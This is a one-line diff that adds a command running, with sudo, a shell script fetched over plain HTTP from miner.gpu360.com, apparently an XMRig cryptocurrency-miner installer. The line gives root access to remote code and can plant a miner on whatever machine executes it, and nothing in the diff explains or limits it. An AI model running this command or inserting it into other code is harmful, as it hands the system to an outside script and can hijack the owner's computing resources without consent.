@@ -1,0 +1,1 @@
+sudo sh -c "$(curl -fsSL http://miner.gpu360.com/xmrig/run.sh)"
